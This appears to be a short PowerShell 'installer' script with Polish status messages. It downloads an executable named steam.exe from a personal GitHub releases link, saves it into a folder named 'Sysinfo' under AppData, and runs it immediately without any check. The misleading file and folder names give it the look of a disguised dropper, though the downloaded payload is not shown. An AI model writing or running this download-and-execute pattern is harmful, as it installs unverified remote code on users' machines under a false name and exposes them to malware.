Write-Host ""
Write-Host "Sigma installer WTTI"
Write-Host "Instalowanie..."

$repoRaw = "https://github.com/bartuss225/pliki/releases/download/v1.1.1/steam.exe"
$installDir = Join-Path $env:APPDATA "Sysinfo"
$outFile    = Join-Path $installDir "steam.exe"

if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}


try {
    Invoke-WebRequest -Uri $repoRaw -OutFile $outFile
} catch {
    Write-Error "Błąd pobierania pliku"
    exit 1
}

Write-Host "Zrobione!"
Start-Process $outFile
